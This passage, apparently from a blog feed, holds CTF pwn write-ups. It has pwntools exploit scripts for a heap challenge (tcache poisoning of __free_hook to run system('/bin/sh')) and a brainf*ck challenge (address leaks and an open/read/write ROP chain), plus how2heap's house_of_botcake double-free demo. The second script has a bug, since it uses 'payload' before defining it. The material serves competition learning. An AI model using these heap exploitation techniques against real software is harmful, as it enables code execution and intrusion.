class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./webheap_revenge&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;webheap_revenge&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">&#x27;jsjjs&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x83&#x27;</span>+p64(size)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=<span class="built_in">str</span>(content)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">2</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload2=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload2+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload2)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">3</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    <span class="comment">#payload+=bytes(content,encoding=&quot;utf-8&quot;)</span></span><br><span class="line">    payload+=content</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x300</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libc_base+<span class="number">0x4f2a5</span></span><br><span class="line">rce2=libc_base+<span class="number">0x4f302</span></span><br><span class="line">rce3=libc_base+<span class="number">0x10a2fc</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook-8))</span></span><br><span class="line"><span class="comment">#add(7,0x400,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#add(5,0x400,p64(rce1))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#edit(5,p64(rce1))</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    add(i,0x80)</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook))</span></span><br><span class="line"><span class="comment">#add(10,0x80)</span></span><br><span class="line"><span class="comment">#add(11,0x80)</span></span><br><span class="line"><span class="comment">#edit(11,p64(system))</span></span><br><span class="line"><span class="comment">#edit(10,&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="comment">#delete(10)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x400</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(system))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>BFï¼š</p><h3 id="This-question-is-an-original-question-of-the-Southwest-Division-Competition-which-directly-uses-the-script-of-Master-Kot-to-type-the-leaked-address-This-question-limits-the-fd-of-read-and-you-can-just-close-it-directly-This-question-comes-out-after-the-game-and-the-complicated-point-is-the-fd-But-close-0-can-change-fd"><a href="#This-question-is-an-original-question-of-the-Southwest-Division-Competition-which-directly-uses-the-script-of-Master-Kot-to-type-the-leaked-address-This-question-limits-the-fd-of-read-and-you-can-just-close-it-directly-This-question-comes-out-after-the-game-and-the-complicated-point-is-the-fd-But-close-0-can-change-fd" class="headerlink" title="This question is an original question of the Southwest Division Competition, which directly uses the script of Master Kot to type the leaked address. This question limits the fd of read, and you can just close it directly. This question comes out after the game, and the complicated point is the fd. But close(0) can change fd"></a>This question is an original question of the Southwest Division Competition, which directly uses the script of Master Kot to type the leaked address. This question limits the fd of read, and you can just close it directly. This question comes out after the game, and the complicated point is the fd. But close(0) can change fd</h3><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;192.168.0.76&#x27;, 58011)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;TEST&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop_rdi = 0x0000000000000973 # pop rdi ; ret</span></span><br><span class="line"><span class="string">ret = 0x000000000000001a # ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pay = <span class="string">&#x27;+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span>*<span class="number">2</span></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#x27;</span>*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;,&gt;&#x27;</span>*<span class="number">8</span> * <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay += &#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">dd = <span class="string">&#x27;0&#x27;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(dd)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">pie = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x854</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x24083</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">one = [0xe3afe, 0xe3b01, 0xe3b04]</span></span><br><span class="line"><span class="string"># print(hex(libcbase + one[0]))</span></span><br><span class="line"><span class="string">p.sendline(p64(one[2]+libcbase))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x0000000000023b6a</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x000000000002601f</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x0000000000142c92</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">op = libcbase + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">re = libcbase + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">wr = libcbase + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax=libcbase+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">close=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">syscall=libcbase+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">payload1=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)+p64(pop_rdi)</span><br><span class="line">payload+=p64(stack+<span class="number">8</span>*<span class="number">21</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(stack+<span class="number">8</span>*<span class="number">21</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(re)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(wr)+<span class="string">&#x27;flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Summary: This question is difficult for me. It is difficult to reverse the code and debug. After debugging for a long time, I actually feel that these two questions are very good, because some time ago, many competitions put the questions in the latest libc, because it is impossible in actual combat. When I encounter new libc, I rarely encounter libc in actual combat. Even if I encounter libc, the version is relatively old. However, the two questions in this competition have increased the amount of code (inverse vector). Such questions are closer to actual combat and can be enhanced. In fact, the reverse ability and code audit are not pwn. In this web question, they are closer to actual combat. I feel that future competitions will be closer to actual combat.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022-Strong-Network-Mimic-CTF-PWN-writeup&quot;&gt;&lt;a href=&quot;#2022-Strong-Network-Mimic-CTF-PWN-writeup&quot; class=&quot;headerlink&quot; title=&quot;2022 Stron</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>house_of_botcake</title>
    <link href="https://jsjsj.top/2022/10/01/house-of-botcake/"/>
    <id>https://jsjsj.top/2022/10/01/house-of-botcake/</id>
    <published>2022-10-01T14:11:32.000Z</published>
    <updated>2023-10-04T06:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-house-of-botcake"><a href="#PWN-house-of-botcake" class="headerlink" title="PWN house_of_botcake"></a>PWN house_of_botcake</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h1><p>In the DASCTF October competition, there was an inspection of house_of_botcake. I thought it was very strange at the time. I had never used this method before, so I went to how2heap to learn it. It was actually very simple, not as complicated as I imagined.</p><p>Letâ€™s rely on the source code analysis wave</p><p>house_of_botcake.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating a chunk for later consolidation: prev @ %p\n&quot;</span>, prev);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk: a @ %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we have the chunk overlapping primitive:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev @ %p, size: %#x, end @ %p\n&quot;</span>, prev, prev_size, (<span class="type">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim @ %p, size: %#x, end @ %p\n&quot;</span>, a, a_size, (<span class="type">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to the adaptation demo of a master on the Internet:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> stack_var[<span 